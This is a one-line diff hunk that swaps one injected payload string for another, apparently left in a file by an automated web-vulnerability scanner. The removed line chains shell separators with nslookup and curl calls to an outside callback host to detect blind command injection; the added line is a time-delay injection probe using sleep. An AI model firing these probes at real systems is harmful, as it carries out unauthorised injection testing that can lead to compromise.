@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitnocstdnncb6061b.bxss.me||curl hitnocstdnncb6061b.bxss.me)|(nslookup -q=cname hitnocstdnncb6061b.bxss.me||curl hitnocstdnncb6061b.bxss.me)&(nslookup -q=cname hitnocstdnncb6061b.bxss.me||curl hitnocstdnncb6061b.bxss.me)
+555"||sleep(27*1000)*vqvnyb||"
